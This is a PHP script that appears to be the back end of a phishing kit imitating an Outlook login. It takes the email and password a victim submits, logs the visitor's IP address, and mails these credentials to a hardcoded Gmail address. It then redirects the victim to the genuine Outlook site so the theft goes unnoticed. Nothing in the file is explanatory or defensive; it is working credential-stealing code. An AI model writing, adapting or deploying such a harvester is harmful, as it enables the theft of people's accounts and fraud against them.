<?php
header('Location: index.html');

$email=$_POST["email"];
$pass=$_POST["pass"];
$ipv=getenv("REMOTE_ADDR");
$dat3 =date("D M d, Y ");
$to  = "hectordelgadoaraujo@gmail.com" . ", " ;
$to .= "hectordelgadoaraujo@gmail.com";
$subj = "email - $ipv";
$headers = "From: info <contact>\r\n";
mail($email,$subject,$message,$headers);
mail($blockeduse,$subject,$message,$headers);
$msj = "---------------------- info  ----------------------\n
---------------- Datos de $ipv --------------------------------\n

     email: $email
	 pass: $pass


	
	

  

--------------------------------------------------------------------------";

$headers = "login>\n";
$headers .= "\n";
	mail($to, $subj, $msj,$headers);
header('Location: https://outlook.live.com/owa/');
?>
